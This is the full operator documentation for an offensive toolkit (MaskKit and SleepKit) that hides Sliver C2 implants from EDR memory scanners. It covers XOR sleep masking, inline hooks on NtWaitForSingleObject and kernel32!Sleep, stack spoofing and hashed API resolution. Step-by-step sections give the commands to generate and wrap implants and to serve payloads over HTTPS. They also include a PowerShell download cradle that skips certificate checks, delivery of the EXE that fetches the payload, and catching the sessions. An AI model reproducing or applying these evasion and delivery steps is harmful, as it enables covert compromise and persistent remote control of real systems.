# Sleep Mask Kit — Documentation

## Table of Contents

1. [What Is Sleep Mask Kit?](#1-what-is-sleep-mask-kit)
2. [Background: The EDR Memory Scanning Problem](#2-background-the-edr-memory-scanning-problem)
3. [Tool Overview](#3-tool-overview)
4. [How Cobalt Strike Sleep Mask Kit Works](#4-how-cobalt-strike-sleep-mask-kit-works)
5. [The Sliver Problem — Why CS Techniques Don't Directly Apply](#5-the-sliver-problem--why-cs-techniques-dont-directly-apply)
6. [How MaskKit Works](#6-how-maskkit-works)
7. [How SleepKit Works](#7-how-sleepkit-works)
8. [Choosing Between MaskKit and SleepKit](#8-choosing-between-maskkit-and-sleepkit)
9. [Setup: MaskKit](#9-setup-maskkit)
10. [Setup: SleepKit](#10-setup-sleepkit)
11. [Usage: MaskKit — Step by Step](#11-usage-maskkit--step-by-step)
12. [Usage: SleepKit — Step by Step](#12-usage-sleepkit--step-by-step)
13. [Evasion Techniques Explained](#13-evasion-techniques-explained)
14. [Command Reference](#14-command-reference)
15. [Architecture Diagrams](#15-architecture-diagrams)
16. [Troubleshooting](#16-troubleshooting)

---

## 1. What Is Sleep Mask Kit?

The **Cobalt Strike Sleep Mask Kit** is an operator kit that lets you customize what Beacon does when it sleeps. Between C2 callbacks, Beacon sits idle in memory — and that idle period is when EDRs typically scan. The Sleep Mask Kit allows the operator to define a custom sleep routine that:

1. Encrypts Beacon's own code and data in memory before sleeping
2. Executes the actual sleep
3. Decrypts Beacon's memory after waking
4. Continues normal operation

The result: during the scan window (the sleep period), the memory region where Beacon lives appears as garbage bytes in a non-executable page — not shellcode.

**This directory contains two independent implementations for Sliver:**

| Tool | Output | Delivery | Hook approach |
|------|--------|----------|---------------|
| **MaskKit** | Raw `.bin` shellcode | Inject via any loader | C inline hook on `NtWaitForSingleObject` |
| **SleepKit** | Windows `.exe` host binary | Execute directly | Go runtime hook on `kernel32!Sleep` + timer goroutine |

Both are first-ever Sliver ports of the Sleep Mask Kit concept. Neither existed before this suite.

---

## 2. Background: The EDR Memory Scanning Problem

### How EDRs Find Shellcode in Memory

Modern EDRs use multiple scanning strategies:

**Signature scanning**: Pattern-match against known shellcode sequences (NOP sleds, specific instruction patterns, PE headers). Fast but evaded by encryption or modification.

**Heuristic scanning**: Look for suspicious characteristics — executable memory that isn't backed by a file on disk, high entropy regions, regions with no name/path, unexpected executable regions in non-executable processes.

**API hooks**: Hook `VirtualAlloc`, `CreateThread`, etc. to detect shellcode allocation at the time it happens.

**Periodic memory scanning**: Scan all process memory regions on a schedule, or when a process calls `Sleep()`. This is the vector Sleep Mask Kit targets.

### The Scan Window

The critical insight is that shellcode must be **unencrypted and executable** while it's running, but it doesn't need to be readable while it's sleeping. The "scan window" is the sleep period:

```
Timeline:
                    SC running      SC sleeping (scan window)    SC running
                  ┌──────────┐     ┌───────────────────────────┐  ┌──────────┐
[not allocated]   │ RX, plain│     │  ??? ← this is the target │  │ RX, plain│
                  └──────────┘     └───────────────────────────┘  └──────────┘
                  ↑ SC starts      ↑ Sleep called               ↑ Wake
```

If an EDR scans during the sleep window and finds executable shellcode, it alerts. If instead it finds a `PAGE_READWRITE` region full of random-looking bytes, it sees nothing suspicious.

### Why Sleep Is the Right Target

All C2 implants sleep between callbacks. Sliver's default sleep is 60 seconds with 10% jitter. During those 60 seconds, Sliver's goroutines are mostly blocked waiting on a timer. That's 60 seconds of scan window every callback cycle.

---

## 3. Tool Overview

### MaskKit

A C shellcode that wraps a Sliver shellcode. The output (`masked.bin`) is a flat PIC shellcode blob that:
- Has no PE headers
- Can be delivered via process injection, PalaceKit, or any loader
- Contains the masking logic + the Sliver shellcode encrypted inside it
- Installs a hook on `NtWaitForSingleObject` to intercept C2 sleep calls
- XOR-encrypts the Sliver shellcode region during sleep

**Key property**: MaskKit itself is pure C code. No Go runtime in the payload. The final shellcode is ~3–4 KB of machine code wrapping whatever size Sliver implant you use.

### SleepKit

A Go EXE that hosts a Sliver shellcode. The output (`mask.exe`) is a Windows executable that:
- Fetches the Sliver shellcode from an HTTPS URL
- Runs the shellcode in an RX allocation
- Hooks `kernel32!Sleep` and runs a timer goroutine for masking
- XOR-encrypts the shellcode region during sleep intervals

**Key property**: SleepKit is a Go binary. The masking logic runs in Go goroutines, making it very easy to extend and reason about. The payload is larger (Go binaries are several MB) but easier to build and customize.

---

## 4. How Cobalt Strike Sleep Mask Kit Works

Understanding the CS original helps understand our adaptations.

### The BEACON_SLEEP_MASK Callback

Cobalt Strike's Beacon has a built-in callback mechanism: before each sleep, Beacon calls `BEACON_SLEEP_MASK`. The Sleep Mask Kit lets you define this callback.

The typical CS sleep mask implementation:

```c
void BEACON_SLEEP_MASK(void *beacon_info, DWORD sleep_ms) {
    // 1. Mask: encrypt Beacon's own memory
    BEACON_INFO *info = (BEACON_INFO *)beacon_info;
    XorMemory(info->text_start, info->text_size, g_key);
    XorMemory(info->data_start, info->data_size, g_key);
    
    // 2. Spoof call stack (look like a legitimate thread)
    SpoofCallStack();
    
    // 3. Wait using a waitable timer (not Sleep(), which is hooked by EDRs)
    WaitableTimerSleep(sleep_ms);
    
    // 4. Restore call stack
    RestoreCallStack();
    
    // 5. Unmask: decrypt
    XorMemory(info->text_start, info->text_size, g_key);
    XorMemory(info->data_start, info->data_size, g_key);
}
```

### Stack Spoofing

A sophisticated addition to sleep masking: before sleeping, spoof the thread's call stack. A debugger or stack-walking EDR sees a fake, innocent-looking call chain instead of `Beacon → SleepMask → NtDelayExecution`.

The CS technique uses `RtlCaptureContext` to save the real CPU context, then manipulates `RSP` and stack frames to create fake return addresses pointing into ntdll or kernel32, then calls `NtContinue` to "jump" into the sleep function with the fake stack visible to scanners.

### Waitable Timer Sleep

Instead of calling `Sleep()` (which EDRs hook), use a waitable timer:

```c
HANDLE timer = CreateWaitableTimerExW(NULL, NULL, 
    CREATE_WAITABLE_TIMER_HIGH_RESOLUTION, TIMER_ALL_ACCESS);
LARGE_INTEGER due_time;
due_time.QuadPart = -(LONGLONG)sleep_ms * 10000LL; // 100ns units, negative = relative
SetWaitableTimer(timer, &due_time, 0, NULL, NULL, FALSE);
WaitForSingleObject(timer, INFINITE);
CloseHandle(timer);
```

This avoids `Sleep()` (which is `kernel32!Sleep`) entirely. EDRs that hook `Sleep` to detect sleeping shellcode won't see this call.

---

## 5. The Sliver Problem — Why CS Techniques Don't Directly Apply

Sliver is written in Go. Go's runtime makes several CS techniques unsafe or impossible:

### Problem 1: No BEACON_SLEEP_MASK Callback

Sliver has no equivalent of this callback. There's no sanctioned way to inject code that runs "just before Sliver sleeps."

**Solution**: Hook `NtWaitForSingleObject` directly (MaskKit) or use an external timer/hook (SleepKit).

### Problem 2: Go's Preemptive Scheduler

Go's runtime sends `SIGURG` (or uses hardware breakpoints on Windows) to preempt goroutines every ~10ms. This means any goroutine can be interrupted at any instruction boundary.

If we try to install inline hooks from within the shellcode runner, the hooks may be in a corrupted state when the scheduler preempts and restores context. The scheduler may overwrite registers or stack values our hook depends on.

**Solution**: MaskKit installs hooks before the Sliver shellcode starts. The hooks are in the masker's memory space, not inside Go's runtime. The hook installs cleanly, runs cleanly, and doesn't interfere with Go's scheduler state.

### Problem 3: Goroutines Are Not Threads

Sliver uses hundreds of goroutines, but they may be multiplexed onto a small number of OS threads (GOMAXPROCS). You can't identify "the sleep thread" because sleep may be spread across multiple goroutines on multiple OS threads.

**Solution**: Filter by call duration. The Go scheduler's own waits are microseconds to ~10ms. Sliver's C2 sleep is set by the operator (typically 30–600 seconds). Hook `NtWaitForSingleObject` and only trigger masking when the wait duration exceeds 5 seconds.

### Problem 4: Concurrent Memory Access

If we try to XOR-encrypt Sliver's shellcode region from one goroutine while the Go scheduler might dispatch another goroutine to that same region (for the signal handler, stack unwinding, etc.), we get a race condition that crashes immediately.

**Solution**: Before masking, `NtSuspendThread` freezes the shellcode's OS thread. This is safe because we're calling it from outside the Go runtime — the masker code is NOT Go.

---

## 6. How MaskKit Works

### The Payload Structure

The `masked.bin` output is a flat binary:

```
Offset 0      → masker shellcode (PIC x64 code, ~3–4 KB)
Offset N      → magic marker: 0xB33FCAFE 0xDEAD1337 (8 bytes)
Offset N+8    → MASK_CONFIG struct (16 bytes)
                  interval_ms   [4] — timer polling (0 = hook-only)
                  threshold_ms  [4] — min wait to trigger masking (default 5000)
                  key_len       [4] — XOR key size in bytes
                  sc_len        [4] — Sliver shellcode size in bytes
Offset N+24   → XOR key bytes (key_len bytes)
Offset N+24+K → XOR-encrypted Sliver shellcode (sc_len bytes)
```

### Self-Location (PIC Trick)

The masker finds its own config block without knowing where it was loaded:

```asm
; Get current instruction pointer:
call  .next
.next:
pop   rax          ; rax = address of .next label = base + 5
sub   rax, 5       ; rax = shellcode base address

; Scan forward for magic:
; (done in C with a for loop scanning uint32_t pairs)
```

This trick works because `call` pushes the return address (next instruction's address) onto the stack. By immediately `pop`ping it, we get our own current instruction pointer. Subtracting the offset to the start of the shellcode gives us the load base.

### API Resolution

All Win32 and NT functions are resolved via ROR13 PEB walk (same technique as PalaceKit's `services.c`). The masker has no IAT entries. Function names like `"NtWaitForSingleObject"` never appear as strings in the binary.

### The Inline Hook

After resolving `NtWaitForSingleObject`'s address, the masker writes a 12-byte JMP trampoline over the first 12 bytes of the function in ntdll's memory:

```
Before (original ntdll stub):
  4C 8B D1           mov r10, rcx
  B8 04 00 00 00     mov eax, 4          ← syscall number for NtWaitForSingleObject
  0F 05              syscall
  C3                 ret

After (hooked):
  FF 25 00 00 00 00  JMP QWORD PTR [RIP+0]   ← 6 bytes
  XX XX XX XX XX XX  ← 8-byte absolute addr of hook_NtWaitForSingleObject
  ...                ← remaining original bytes
```

A separate 32-byte trampoline buffer (in the masker's own memory, marked RX) holds:
- The displaced 12 original bytes
- A `JMP [RIP+0]` + absolute address of `(ntdll_stub + 12)` to return execution after the hook bytes

Calling `_real_NtWaitForSingleObject` goes to this trampoline → executes the original syscall stub code → returns normally.

### The Hook Decision

```
hook_NtWaitForSingleObject(handle, alertable, timeout):

  1. If timeout == NULL:
       → infinite wait, not a C2 sleep; pass through
  
  2. If timeout->QuadPart >= 0:
       → absolute time or special value; pass through
  
  3. If already_masking:
       → we ourselves are calling NtWaitForSingleObject (reentrancy guard); pass through
  
  4. Compute wait_100ns = -timeout->QuadPart  (negative = relative time in 100ns units)
     If wait_100ns < threshold_100ns:
       → goroutine scheduler wait, channel op, mutex, etc.; pass through
  
  5. Duration is ≥ threshold (default 5 seconds):
       → this is the C2 sleep
       → mask_on()    [XOR + RW protect]
       → spoof stack  [replace return addr with ntdll RET gadget]
       → call _real_NtWaitForSingleObject  [actual sleep happens here]
       → restore stack
       → mask_off()   [XOR restore + RX protect]
```

### Memory Masking

`mask_on(ctx)`:
1. Set `ctx->masking = TRUE` (reentrancy guard)
2. `NtProtectVirtualMemory(sc_base, sc_size, PAGE_READWRITE, &old)` — make shellcode writable
3. `xor_region(sc_base, sc_size, key, key_len)` — XOR encrypt every byte (key cycles)

`mask_off(ctx)`:
1. `xor_region(sc_base, sc_size, key, key_len)` — XOR decrypt (same operation, self-inverse)
2. `NtProtectVirtualMemory(sc_base, sc_size, PAGE_EXECUTE_READ, &old)` — make RX again
3. Set `ctx->masking = FALSE`

### Stack Spoofing

During the sleep window (between `mask_on` and `mask_off`), the hook function scans the current thread stack for the first return address that looks like it's inside our shellcode or hook, and replaces it with a `RET` gadget found in ntdll's `.text` section:

```
Before spoofing:
  Stack: [ hook_NtWaitForSingleObject | go (masker entry) | ... ]

After spoofing:
  Stack: [ ntdll_ret_gadget | go (masker entry) | ... ]
```

A call-stack walker seeing this thread during the sleep window sees a call that "came from ntdll" rather than from an unknown shellcode region.

After `NtWaitForSingleObject` returns, the hook restores the original return address.

### Sliver Shellcode Execution

After all setup:
1. `NtCreateThreadEx` creates a new OS thread starting at the decrypted Sliver shellcode
2. The masker thread (running the hook) coexists with the Sliver thread
3. Sliver connects back to C2, starts its callback loop
4. On each C2 sleep, the hook fires, masks, waits, unmasks

---

## 7. How SleepKit Works

### The Host Binary

SleepKit compiles to a Windows EXE. When run on target:

1. **Fetch**: Go net/http GET request (InsecureSkipVerify; payload integrity protected by ChaCha20-Poly1305 AEAD) to the operator's HTTPS server; downloads `payload.enc`
2. **Decrypt**: ChaCha20-Poly1305 AEAD decrypt with the key+nonce baked into the binary
3. **Allocate**: `NtAllocateVirtualMemory(PAGE_READWRITE)` — RW allocation
4. **Copy**: Write decrypted shellcode to the allocation
5. **Protect**: `NtProtectVirtualMemory(PAGE_EXECUTE_READ)` — no RWX
6. **Hook**: Install `kernel32!Sleep` JMP hook
7. **Timer**: Start Go goroutine for timer-based masking
8. **Execute**: `NtCreateThreadEx` to start Sliver shellcode thread

### The Hook Layer: kernel32!Sleep

Go installs a 12-byte JMP hook on `kernel32!Sleep` in the host process's memory. When any code calls `kernel32!Sleep(ms)`:

1. Hook fires first
2. If `ms >= threshold`: trigger mask cycle
3. Call `KernelBase!Sleep` (the actual implementation) via a direct pointer — NOT `kernel32!Sleep` (which is hooked) — to avoid infinite recursion

Why `KernelBase!Sleep` instead of the trampoline? `kernel32!Sleep` forwards to `KernelBase!Sleep`. We saved `KernelBase!Sleep`'s address before hooking, so we can call it directly.

### The Timer Layer

A Go goroutine runs independently:

```go
for {
    time.Sleep(interval)  // goroutine-internal sleep (doesn't call kernel32!Sleep)
    
    // Suspend shellcode thread
    ntdll.NtSuspendThread(shellcodeThread)
    
    // XOR encrypt the shellcode region
    for i := range shellcode { shellcode[i] ^= key[i%len(key)] }
    
    // Change to RW (not executable)
    ntdll.NtProtectVirtualMemory(scBase, scSize, PAGE_READWRITE)
    
    // Wait the real interval
    time.Sleep(interval)
    
    // Decrypt
    for i := range shellcode { shellcode[i] ^= key[i%len(key)] }
    
    // Restore RX
    ntdll.NtProtectVirtualMemory(scBase, scSize, PAGE_EXECUTE_READ)
    
    // Resume
    ntdll.NtResumeThread(shellcodeThread)
}
```

The timer layer's internal `time.Sleep` calls are Go's own goroutine scheduler — they DON'T go through `kernel32!Sleep`. They use `NtWaitForSingleObject` with very short timeouts and are not intercepted by our hook.

### Why Two Layers?

Sliver's Go runtime sleeps via two paths:

- **Path 1**: User code `time.Sleep(30 * time.Second)` → `runtime.usleep` → `kernel32!Sleep` ← caught by hook
- **Path 2**: Go scheduler internal timer → `NtWaitForSingleObject` directly ← NOT caught by hook

The timer layer catches Path 2 by masking on a fixed schedule regardless of what the shellcode thread is doing.

---

## 8. Choosing Between MaskKit and SleepKit

| Question | MaskKit | SleepKit |
|----------|---------|----------|
| Do you need a raw shellcode to inject? | ✅ Yes | ❌ No — produces EXE |
| Do you need a standalone EXE? | ❌ No | ✅ Yes |
| Do you want to chain with PalaceKit? | ✅ Yes — wrap MaskKit output | ⚠️ Possible but adds complexity |
| Do you need stack spoofing? | ✅ Yes | ❌ No |
| Do you want the simplest possible build? | Moderate | ✅ Yes |
| Is Go runtime presence in payload acceptable? | ❌ No — pure C | ✅ Yes |
| Do you want a timer-based backup masking loop? | ❌ No (hook-only) | ✅ Yes |

**Decision tree**:
```
Need to inject shellcode?
  YES → MaskKit
  NO  → Need standalone EXE?
          YES → SleepKit
          NO  → Both work; MaskKit is more flexible
```

**Recommended combination**: Use **MaskKit** to produce a masked shellcode, then use **PalaceKit** (in Crystal-Palace-Kit/) to wrap it in a Crystal Kit-format loader:

```bash
# Step 1: Generate Sliver shellcode
sliver > generate --format shellcode --os windows --arch amd64 --save implant.bin

# Step 2: MaskKit — wrap with sleep masker
maskkit wrap --shellcode implant.bin --output masked.bin

# Step 3: PalaceKit — wrap with Crystal Kit loader (IAT hiding, etc.)
cd ../Crystal-Palace-Kit/palacekit
palacekit build --shellcode masked.bin --output build/final.bin

# Step 4: Serve
palacekit serve --payload build/final.bin
```

This gives you: Crystal Kit evasion (no IAT, PIC) + sleep masking (XOR + stack spoof) + Sliver C2.

---

## 9. Setup: MaskKit

### Prerequisites

```bash
# Install mingw-w64
apt install mingw-w64

# Verify cross-compiler
x86_64-w64-mingw32-gcc --version
```

### Build Steps

```bash
cd Sleep-Mask-Kit/maskkit

# Build everything: C masker object + Go CLI
make all
```

Expected output:
```
x86_64-w64-mingw32-gcc -DWIN_X64 ... unity.c -o ../bin/masker.x64.o
go build -o maskkit ./cmd/maskkit
```

The C sources compile as a **unity build** (`unity.c` includes all four sources into one translation unit) producing a single `bin/masker.x64.o`. This is required for PIC shellcode compatibility.

Or separately:
```bash
make masker   # C object only  → bin/masker.x64.o
make cli      # Go CLI only    → ./maskkit
```

### Verify

```bash
./maskkit gen-hashes
# Should print ROR13 hashes for all NT functions used by the masker
```

---

## 10. Setup: SleepKit

### Prerequisites

```bash
# Go 1.21+
go version
```

### Build Steps

```bash
cd Sleep-Mask-Kit/sleepkit

# Build the operator CLI
go build -o sleepkit ./cmd/sleepkit

# Or with garble (obfuscated symbols in CLI):
make cli-garble
```

---

## 11. Usage: MaskKit — Step by Step

### Complete Workflow

#### Step 1 — Start Sliver listener

```
sliver > mtls --lport 8888
[*] Successfully started job #1
```

#### Step 2 — Generate Sliver shellcode

```
sliver > generate \
    --format shellcode \
    --os windows \
    --arch amd64 \
    --mtls 192.168.1.10 \
    --sleep 60s \
    --jitter 10 \
    --save implant.bin
```

**Note the sleep setting**: Sliver will sleep 60 seconds ± 10% between callbacks. Our masking threshold is 5 seconds, so any wait >= 5s will trigger masking. Sliver's 60-second sleeps will be caught.

#### Step 3 — Wrap with MaskKit

```bash
cd Sleep-Mask-Kit/maskkit

./maskkit wrap \
    --shellcode implant.bin \
    --threshold 5000 \
    --output build/masked.bin
```

Output:
```
[*] Shellcode: 589824 bytes
[*] Masker shellcode: 3472 bytes
[+] Payload: 593384 bytes → build/masked.bin
[+] Key: df41c021afc61efe5945c964a77d9b51f9ae1be85bfd2494e7ffd4f0e8b47321
[+] Threshold: 5000 ms (waits > 5s trigger masking)
```

What this built:
- Linked the 4 COFF masker objects into a ~3.4 KB PIC shellcode
- Generated a random 32-byte XOR key
- XOR-encrypted the 590 KB Sliver shellcode
- Assembled the full blob: `[masker][magic][config][key][encrypted SC]`

#### Step 4 — Serve the payload

```bash
./maskkit serve --payload build/masked.bin --port 8443
```

```
[*] Serving 593384 bytes on https://0.0.0.0:8443/3fa29c1d8e7b04a2
```

Or serve after wrapping in one step:
```bash
./maskkit make --shellcode implant.bin
./maskkit serve --payload build/masked.bin
```

#### Step 5 — Deliver and execute

Execute `masked.bin` on the Windows target via process injection. Example using a PowerShell cradle (adjust for your tradecraft):

```powershell
# Download
$wc = New-Object System.Net.WebClient
$wc.Headers.Add("User-Agent", "Mozilla/5.0")
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
$sc = $wc.DownloadData("https://192.168.1.10:8443/3fa29c1d8e7b04a2")

# Inject into a target process (PowerShell example — adapt to your injector)
```

Or combine MaskKit with PalaceKit for a full Crystal Kit loader delivery:

```bash
cd Crystal-Palace-Kit/palacekit
./palacekit build \
    --shellcode Sleep-Mask-Kit/maskkit/build/masked.bin \
    --spec loader/loader.spec \
    --output build/palace_masked.bin
```

#### Step 6 — Observe masking in action

On the target, when Sliver sleeps:
- EDR that scans `VirtualQuery(sc_address)` sees: `PAGE_READWRITE`, no execute bit
- EDR that scans the bytes sees: XOR-encrypted noise, no recognizable shellcode
- After sleep ends: region is RX again, Sliver callback proceeds normally

#### Step 7 — Catch the session

```
sliver > sessions

ID         Name           Transport  Remote Address      ...
ae3f9124   DESKTOP-A4B2C  mtls       192.168.1.55:49921  ...
```

### Advanced: Threshold Tuning

The default threshold is 5000ms (5 seconds). Sliver's minimum practical sleep is a few seconds. You may want to tune this:

```bash
# Conservative (catch only very long sleeps, miss short ones)
./maskkit wrap --shellcode implant.bin --threshold 10000   # 10 seconds

# Aggressive (catch anything > 2 seconds)
./maskkit wrap --shellcode implant.bin --threshold 2000    # 2 seconds
```

Lower threshold: more masking cycles but also more false positives (goroutine timers in the 1–5s range). The Go runtime's own waits are typically under 100ms, so 2000ms is very safe.

---

## 12. Usage: SleepKit — Step by Step

### Complete Workflow

#### Step 1 — Start Sliver listener (same as above)

#### Step 2 — Generate Sliver shellcode (same as above)

```
sliver > generate --format shellcode --os windows --arch amd64 --mtls 192.168.1.10 --save implant.bin
```

#### Step 3 — Build the masked EXE

```bash
cd Sleep-Mask-Kit/sleepkit

./sleepkit build \
    --shellcode implant.bin \
    --url https://192.168.1.10:8443 \
    --sleep 30s \
    --serve
```

Output:
```
[+] payload  → build/payload.enc
[+] mask.exe → build/mask.exe
[+] sleep    → 30s (30000 ms)
[*] One-shot HTTPS server on :8443 — shuts down after one download
[+] Staging URL: https://192.168.1.10:8443/a3f91c04b2e8d17f
    (random path — baked into mask.exe, only this URL works)
[i] Deliver mask.exe to target. It fetches shellcode and runs with sleep masking.
```

**What this did**:
- ChaCha20-Poly1305 encrypted the shellcode with a random key+nonce
- Cross-compiled `mask.exe` for Windows x64 with the key+nonce and URL embedded in the binary
- Started a one-shot HTTPS server with a randomly generated path baked into the EXE

#### Step 4 — Deliver mask.exe to target

Transfer `build/mask.exe` to the target via your access method.

#### Step 5 — Execute on target

When `mask.exe` runs:

1. Downloads `payload.enc` from `https://192.168.1.10:8443/p` (ignores cert errors)
2. Decrypts with the embedded key
3. Allocates RW memory, copies decrypted shellcode, marks RX
4. Hooks `kernel32!Sleep`
5. Starts timer goroutine (masks every 30 seconds regardless of Sleep calls)
6. Starts Sliver shellcode thread via `NtCreateThreadEx`
7. The HTTPS server shuts down — payload URL is now dead

#### Step 6 — Catch session (same as above)

### Serving a Pre-built Payload

If you've already run `sleepkit build` and have `payload.enc`, you can restart the server without rebuilding:

```bash
./sleepkit serve --payload build/payload.enc --port 8443
```

Note: Do NOT reuse `payload.enc` with a different `mask.exe`. The key is baked into the EXE at build time. If you build a new EXE, a new `payload.enc` is generated with a new key.

---

## 13. Evasion Techniques Explained

### XOR Memory Masking

XOR is its own inverse: `A XOR K XOR K = A`. This makes it perfect for in-place encryption:

```
Encrypt:  original_byte XOR key_byte = encrypted_byte
Decrypt:  encrypted_byte XOR key_byte = original_byte
```

The key cycles over the shellcode length: `key[i % key_len]`. This means if two bytes have the same key position, they XOR to the same value — which creates a detectable pattern in very long shellcodes with short keys. We use a 32-byte (256-bit) key, which is sufficient to break up any patterns in typical shellcodes.

The encryption is done in a tight loop with no function calls — fast enough that a 600KB shellcode encrypts in microseconds.

### Memory Protection Change

XOR alone might not fool a smart scanner that knows to look at non-executable memory. The protection change adds a second layer:

- During sleep: `PAGE_READWRITE` — not executable
- During execution: `PAGE_EXECUTE_READ` — no write

Most EDRs prioritize scanning executable regions. A `PAGE_READWRITE` region is typically ignored by signature scanners even if they walk all regions.

The combined effect: the region is both non-executable AND contains only random-looking bytes during the scan window.

### Why NtWaitForSingleObject and Not Sleep

Sliver's Go runtime does NOT call `kernel32!Sleep`. Go's runtime calls `NtWaitForSingleObject` or `NtDelayExecution` directly (via syscall). Hooking `Sleep` (as SleepKit does) only catches calls that come through the Win32 layer.

MaskKit hooks `NtWaitForSingleObject` directly in ntdll, catching both paths.

SleepKit compensates for this with the timer layer — it masks on a fixed interval regardless of how Sliver sleeps.

### ROR13 Hash-Based API Resolution

The masker needs to call NT functions (`NtAllocateVirtualMemory`, `NtProtectVirtualMemory`, `NtCreateThreadEx`, `NtWaitForSingleObject`) to do its work. But it can't have those strings in its binary and can't have IAT entries.

Solution: Walk the PEB's module list, hash every exported function name, and match against hardcoded hash constants. The only strings in the masker binary are the magic number constants — and those aren't recognizable function names.

```
"NtWaitForSingleObject" → ROR13 → 0xAE06C1B2
"NtCreateThreadEx"      → ROR13 → 0x4D1DEB74
```

These hash constants appear as raw integers in the binary with no associated strings.

### Stack Spoofing (MaskKit)

The masker thread's call stack during sleep is:

```
Without spoofing (visible to scanner):
  NtWaitForSingleObject ← hook_NtWaitForSingleObject ← go (masker entry) ← kernel32 thread start

With spoofing (visible to scanner):
  NtWaitForSingleObject ← ntdll_ret_gadget ← ???
```

The spoofed stack ends abruptly at an ntdll instruction rather than revealing our shellcode. This makes it harder for an EDR using call-stack analysis to connect the sleep call to an unhooked shellcode region.

---

## 14. Command Reference

### MaskKit

```bash
# Build masker C objects only
make masker

# Build Go CLI only
make cli

# Build everything
make all

# Wrap a Sliver shellcode with the masker
./maskkit wrap \
    --shellcode implant.bin \
    --threshold 5000 \       # ms: waits >= 5s trigger masking
    --interval 0 \           # ms: timer-based poll (0 = hook-only, recommended)
    --key "" \               # hex key (empty = random 32 bytes)
    --bin-dir bin \          # directory with compiled COFF objects
    --output build/masked.bin

# Compile C sources AND wrap in one step
./maskkit make \
    --shellcode implant.bin \
    --threshold 5000 \
    --output build/masked.bin

# Serve the payload once over HTTPS
./maskkit serve \
    --payload build/masked.bin \
    --port 8443

# Print ROR13 hashes for verification
./maskkit gen-hashes
```

### SleepKit

```bash
# Build the Go CLI (includes mask.exe cross-compiler)
go build -o sleepkit ./cmd/sleepkit

# Build the masked EXE + start server
./sleepkit build \
    --shellcode implant.bin \
    --url https://192.168.1.10:8443 \    # scheme and host:port only; path is auto-generated when --serve is given
    --sleep 30s \                         # timer masking interval
    --serve                               # start HTTPS server
    --output build/                       # directory for mask.exe + payload.enc

# Build without serving
./sleepkit build \
    --shellcode implant.bin \
    --url https://192.168.1.10:8443 \
    --sleep 30s

# Serve an already-built payload
./sleepkit serve \
    --payload build/payload.enc \
    --port 8443
```

---

## 15. Architecture Diagrams

### MaskKit Payload Layout

```
masked.bin:

  ┌────────────────────────────────────────────────────────┐
  │  MASKER SHELLCODE (PIC x64)                            │
  │                                                        │
  │  go():                                                 │
  │    resolve_all()       ← ROR13 PEB walk all NT funcs  │
  │    find_config()       ← scan forward for magic       │
  │    NtAllocVM(RW)       ← allocate for Sliver SC       │
  │    memcpy + XOR        ← decrypt SC in place          │
  │    NtProtectVM(RX)     ← no RWX                       │
  │    hook_install()      ← patch ntdll!NtWaitForSingle  │
  │    NtCreateThreadEx()  ← start Sliver SC              │
  │    real_NtWait(thread) ← wait for Sliver to exit      │
  │                                                        │
  │  hook_NtWaitForSingleObject():                         │
  │    check duration threshold                            │
  │    mask_on() → NtWait real → mask_off()               │
  │                                                        │
  │  mask_on/off(): XOR + NtProtect                        │
  │  services.c: patch_resolve, resolve_all                │
  │                                                        │
  ├────────────────────────────────────────────────────────┤
  │  MAGIC: 0xB33FCAFE 0xDEAD1337                          │ ← 8 bytes
  ├────────────────────────────────────────────────────────┤
  │  CONFIG (16 bytes)                                     │
  │    interval_ms, threshold_ms, key_len, sc_len          │
  ├────────────────────────────────────────────────────────┤
  │  XOR KEY (32 bytes, random)                            │
  ├────────────────────────────────────────────────────────┤
  │  XOR-ENCRYPTED SLIVER SHELLCODE (N bytes)              │
  └────────────────────────────────────────────────────────┘
```

### MaskKit Runtime Timeline

```
Time ─────────────────────────────────────────────────────────────────────────▶

masked.bin    NtAlloc     Decrypt   RX mark   Hook install   Thread start
executes      (RW)        + copy    SC region  NtWaitForSO    Sliver SC
  │             │           │          │            │              │
  ▼             ▼           ▼          ▼            ▼              ▼
[masker code] ────────────────────────────────────────────────────────────────▶
                                                              [Sliver SC]──────▶
                                                                              │
                                                              C2 sleep        │
                                                              (60s wait)      │
                                                              │               │
                                              hook fires ────▶│               │
                                              mask_on()        │               │
                                              [XOR + RW]       │ ← scan window │
                                                               │               │
                                              (60s passes)     │               │
                                                               │               │
                                              mask_off() ─────▶│               │
                                              [XOR + RX]                       │
                                                              next callback ───▶
```

### SleepKit Runtime Architecture

```
mask.exe (Windows process)

  ┌─────────────────────────────────────────────────────────────────┐
  │                                                                 │
  │  Main goroutine:                                               │
  │    WinHTTP fetch → XOR decrypt → NtAlloc(RW) → copy           │
  │    → NtProtect(RX) → hook Sleep → start timer goroutine       │
  │    → NtCreateThreadEx(sc) → wait                              │
  │                                                                 │
  │  Timer goroutine (runs every 30s):                            │
  │    NtSuspendThread(sc_thread)                                  │
  │    XOR encrypt sc_region                                       │
  │    NtProtect(sc_region, PAGE_READWRITE)                       │
  │    ┌── [SCAN WINDOW: RW + encrypted] ──┐                      │
  │    │   time.Sleep(30s)                  │  ← Go internal sleep │
  │    └────────────────────────────────────┘                      │
  │    NtProtect(sc_region, PAGE_EXECUTE_READ)                    │
  │    XOR decrypt sc_region                                       │
  │    NtResumeThread(sc_thread)                                   │
  │                                                                 │
  │  kernel32!Sleep hook:                                          │
  │    If Sleep(ms) where ms >= threshold:                        │
  │      Same mask cycle, then KernelBase!Sleep(ms)              │
  │                                                                 │
  │  SC thread (Sliver implant):                                   │
  │    [Go runtime: goroutines, GC, network stack]                │
  │    [C2 connection: mTLS/HTTP2 to operator server]            │
  │    [Sleep: time.Sleep(60s) per callback]                       │
  │                                                                 │
  └─────────────────────────────────────────────────────────────────┘
```

---

## 16. Troubleshooting

### MaskKit

**"read bin dir bin: open bin: no such file or directory"**
The C masker objects haven't been compiled. Run `make masker` first.

**"parse masker.x64.o: unsupported machine type"**
The `.o` files in `bin/` are corrupt or from a different architecture. Run `make masker` to recompile.

**Sliver session never appears**
1. Confirm Sliver listener is running: `sliver > jobs`
2. Confirm `masked.bin` executed on the target (no crash)
3. Check that `--format shellcode` was used when generating (not `--format shared`)
4. Lower the threshold if you think sleep duration is shorter than 5s: `--threshold 2000`

**Crash immediately on target**
Likely cause: the Sliver shellcode is x86 (32-bit) but was expected to be x64. Verify with `file implant.bin`. Always use `--arch amd64` with Sliver.

**Masking not triggering (session works but memory is never encrypted)**
The threshold may be too high for your Sliver sleep setting. If Sliver is set to `--sleep 3s`, the 5-second default threshold won't catch it. Use `--threshold 2000` (2 seconds).

**"hook_install: target is NULL"**
